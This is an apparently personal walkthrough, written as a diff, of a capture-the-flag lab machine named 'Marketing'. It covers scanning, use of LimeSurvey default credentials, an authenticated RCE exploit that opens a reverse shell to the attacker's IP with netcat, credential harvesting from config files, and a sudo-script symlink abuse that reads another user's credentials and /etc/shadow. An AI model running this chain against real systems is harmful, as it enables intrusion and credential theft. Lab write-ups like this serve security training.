@@ -1,0 +1,209 @@
+																							    Marketing Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.225
+export IP=192.168.68.225
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: marketing.pg - Digital Marketing for you!
+
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+/old/
+/vendor/
+
+ http-fileupload-exploiter: 
+|     Couldn't find a file-type field         ?? maybe a file upload feature ?
+
+nikto --url $IP
+
+
+Port 80 information gathering & attack vectors
+
+Template: TemplateMo        <!-- nothing -->
+
+View the source page and notice that there is link that we cannot access unless we add it in the /etc/hosts file.
+
+  <p>
+In order to better understand the wishes of your target group, we provide surveys <a href="//customers-survey.marketing.pg">here</a></p>
+              </div>
+              
+nano /etc/hosts
+192.168.68.225  customers-survey.marketing.pg
+
+The website shows an installation of LimeSurvey.
+
+searchsploit LimeSurvey
+
+Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+LimeSurvey (PHPSurveyor 1.91+ stable) - Blind SQL Injection                                                                                          | php/webapps/18508.txt
+LimeSurvey (phpsurveyor) 1.49rc2 - Remote File Inclusion                                                                                             | php/webapps/4156.txt
+LimeSurvey 1.52 - 'language.php' Remote File Inclusion                                                                                               | php/webapps/4544.txt
+LimeSurvey 1.85+ - 'admin.php' Cross-Site Scripting                                                                                                  | php/webapps/35787.txt
+LimeSurvey 1.92+ build120620 - Multiple Vulnerabilities                                                                                              | php/webapps/19330.txt
+LimeSurvey 2.00+ (build 131107) - Multiple Vulnerabilities                                                                                           | php/webapps/29789.txt
+LimeSurvey 3.17.13 - Cross-Site Scripting                                                                                                            | php/webapps/47386.txt
+LimeSurvey 4.1.11 - 'File Manager' Path Traversal                                                                                                    | php/webapps/48297.txt
+LimeSurvey 4.1.11 - 'Permission Roles' Persistent Cross-Site Scripting                                                                               | php/webapps/48523.txt
+LimeSurvey 4.1.11 - 'Survey Groups' Persistent Cross-Site Scripting                                                                                  | php/webapps/48289.txt
+LimeSurvey 4.3.10 - 'Survey Menu' Persistent Cross-Site Scripting                                                                                    | php/webapps/48762.txt
+LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)                                                                                       | php/webapps/50573.py
+LimeSurvey < 3.16 - Remote Code Execution                                                                                                            | php/webapps/46634.py
+
+Enumeration first !
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 403,404 -t 30 -R3 "http://customers-survey.marketing.pg/FUZZ"
+                                                                                                     
+admin                   // http://customers-survey.marketing.pg/index.php/admin/authentication/sa/login         -- login page                                                                                            
+assets
+installer
+index.php
+modules
+plugins
+themes
+tests
+tmp                       // <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+upload
+
+Search online for default credentials for LimeSurvey.
+
+admin / password      // it works!
+
+LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)                                                                                       | php/webapps/50573.py
+
+For this exploit we need to configure the zip file and the exploit.py exploit for this shit to run.
+
+git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
+cd Limesurvey-RCE
+nano php-rev.php                                               // Add the IP and the port for your reverse_shell:   Line 5 $ip = '192.168.49.68';     Line 6    $port = 4444;    
+zip config.xml php-rev.php > lime.zip               // Create a zip file containing both the config.xml + php-rev.php
+nano exploit.py                                                  // Add the proper location of your zip file: Line 64: filehandle = open("/home/kali/Limesurvey-RCE/lime.zip",mode = "rb") 
+nc -lvnp 4444
+python exploit.py http://customers-survey.marketing.pg admin password 80
+
+Got ze shell boys!
+
+Need to get access to the first flag which belongs to t.miller user.
+
+Let's try to get access to mysql db, but I need to find the user&password of the db. Can't find shit,  let's try a global search.
+
+find / -iname *'config.phpt'* 2>/dev/null
+var/www/LimeSurvey/third_party/kcfinder/conf/config.php
+/var/www/LimeSurvey/application/config/config.php
+/var/www/LimeSurvey/application/models/TemplateConfig.php
+/var/www/LimeSurvey/application/models/ExtensionConfig.php
+/var/www/LimeSurvey/application/third_party/tcpdf/config/tcpdf_config.php
+/var/www/LimeSurvey/application/third_party/tcpdf/tcpdf_autoconfig.php
+/var/www/LimeSurvey/framework/messages/config.php
+
+cat /var/www/LimeSurvey/application/config/config.php
+
+'mysql:host=localhost;port=3306;dbname=limesurvey;',
+ 'emulatePrepare' => true,
+ 'username' => 'limesurvey_user',
+'password' => 'EzPwz2022_dev1$$23!!',
+
+mysql -ulimesurvey_user -p
+EzPwz2022_dev1$$23!!
+
+waste of fucking time, only the admin user is present, we need another way! :(
+
+Remember ... password reuse?
+
+su t.miller
+EzPwz2022_dev1$$23!!
+cat local.txt                          // 98130dd3edaef3a394a34fa43d4607db
+
+
+
+
+Privilege escalation
+
+sudo -l
+(m.sander) /usr/bin/sync.sh
+
+#! /bin/bash
+
+if [ -z $1 ]; then
+    echo "error: note missing"
+    exit
+fi
+
+note=$1
+
+if [[ "$note" =~ .*m.sander.* ]]; then
+    echo "error: forbidden"
+    exit
+fi
+
+difference=$(diff /home/m.sander/personal/notes.txt $note)
+
+if [[ -z $difference ]]; then
+    echo "no update"
+    exit
+fi
+
+echo "Difference: $difference"
+
+cp $note /home/m.sander/personal/notes.txt
+
+echo "[+] Updated."
+
+
+The script takes a file as a first argument, does a diff against a notes file owned by m.sander, and when changes are found /home/m.sander/personal/notes.txt gets updated.
+It is safe to assume, that in /home/m.sander/personal are other personal files except the notes.txt. Since we are unable to list the content of the directory, we have to find a other way to check for possible files.
+
+We notice the groups our current user t.miller is in.
+
+id
+uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
+
+cat /var/lib/mlocate/mlocate.db          // fucking chaos, let's search for lines that contain m.sander, maybe we find something usefull
+                                                      // copy the contents to a local file and perform a grep on the contents
+
+grep -n "m.sander" /var/lib/mlocate/mlocate.db 
+
+/home/m.sander/personalcreds-for-2022.txt
+
+Since we can't see the contents of the file, but we have the /usr/bin/sync.sh wich show the difference between two files, we'll try to use this file to read the contents. 
+However, we have no rights, so let's create a symbolic link that will refence this file, in this way to can see the difference. Some clever shit!
+
+ln -sf /home/m.sander/personal/creds-for-2022.txt /home/t.miller/abc      // you are basically creating a shortcut of the file creds-for-2022.txt to be called “urs”. so far example you can call cat urs
+
+Now let's use the script to see the difference between /home/m.sander/personal/creds-for-2022.txt and /home/m.sander/personal/notes.txt
+
+sudo -u m.sander /usr/bin/sync.sh /home/t.miller/abc
+
+> slack account:
+> michael_sander@gmail.com - pa$$word@123$$4!!
+> 
+> github:
+> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
+> 
+> gmail:
+> michael_sander@gmail.com - EzPwz2022_12345678#!
+
+Ok, we got some passwords, let's try to login with the new user m.sander
+
+su m.sander
+EzPwz2022_12345678#!
+
+sudo -l
+(ALL : ALL) ALL
+
+sudo su
+cd /root
+cat /proof.txt      // 7c91ce6adb690ff0d989590b8110adce
+
+ln -sf /etc/shadow /home/t.miller/test
+sudo -u m.sander /usr/bin/sync.sh /home/t.miller/test
